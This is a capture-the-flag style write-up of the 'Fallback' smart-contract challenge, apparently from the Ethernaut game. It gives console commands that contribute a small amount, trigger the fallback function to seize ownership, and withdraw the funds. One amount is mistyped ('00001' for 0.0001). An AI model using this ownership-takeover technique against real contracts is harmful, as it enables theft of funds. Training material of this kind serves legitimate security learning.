# Fallback

## Problem

The player has to claim ownership of the contract.

## Solution

It can be seen in the contract that to claim ownership you must execute the fallback function by sending an amount of Ether, but first it's necessary to have previously contributed to the contract.

1- contribute to the contract

The value in ethers sent must be less than `0.001` for the contribution to be valid.

```js
contract.contribute.sendTransaction({ value: toWei('00001', 'ether')})

// or

contract.contribute({ value: toWei('0.0001', 'ether')})
```

Once we contribute to the contract, we only need to send any amount of Ethers to the Fallback function to claim ownership.

2- send transaction to fallback function

```js
contract.sendTransaction({ value: toWei('0.0001', 'ether')})
```

3- withdraw

```js
contract.withdraw()
```
